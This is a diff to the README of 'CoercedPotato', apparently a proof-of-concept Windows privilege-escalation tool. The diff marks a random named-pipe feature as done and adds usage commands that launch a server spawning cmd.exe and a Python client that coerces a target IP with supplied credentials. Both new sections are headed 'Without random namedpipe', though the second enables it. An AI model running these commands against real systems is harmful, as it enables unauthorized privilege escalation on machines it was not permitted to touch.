@@ -7,7 +7,7 @@ This is only a POC (for now).
 
 Todo : 
 
-    - Random NamedPipe
+    - Random NamedPipe [DONE]
     
     - Implemention of MS-RPRN interfacce 
     
@@ -16,6 +16,16 @@ Todo :
 
 Usage (for now) : 
 
+- Without random namedpipe (default) :
+
+    > $ ./CoercedPotatoServer -c cmd.exe
+
     > python3 CoercedPotatoClient.py -u user -p password 127.0.0.1 [targeted_IP]
 
-    > ./CoercedPotatoServer -c cmd.exe  
+
+ - Without random namedpipe (given by CoercedPotatoServer output) : 
+ 
+    > $ ./CoercedPotatoServer -c cmd.exe -r true 
+        
+    > python3 CoercedPotatoClient.py -n [randomnamedpipe] -u user -p password -r true 127.0.0.1 [targeted_IP] 
+
